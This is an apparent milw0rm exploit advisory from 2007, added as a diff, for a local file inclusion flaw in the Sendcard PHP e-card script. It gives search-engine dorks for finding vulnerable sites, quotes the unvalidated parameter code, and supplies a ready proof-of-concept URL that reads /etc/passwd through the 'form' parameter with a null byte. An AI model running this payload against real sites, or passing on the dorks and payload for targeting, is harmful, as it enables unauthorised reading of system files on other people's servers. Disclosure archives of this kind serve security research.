@@ -1,0 +1,22 @@
+Sendcard  (sendcard.php) Sendcard Local File Inclusion Vulnerability
+
+Discovered: ettee
+Dork: "Powered by sendcard - an advanced PHP e-card program" -site:sendcard.org
+         "powered by Sendcard"
+
+Bug:
+"// Get the template details
+if(!isset($form) || $form == ''){
+    $form = "form";
+}
+if(!isset($des) || $des == ''){
+    $des = "card";
+}
+if (!isset($template) || $template == '') {
+    $template = 'message';
+}"
+
+PoC:
+http://[site]/[path]/sendcard.php?form=/etc/passwd%00
+
+# milw0rm.com [2007-05-01]
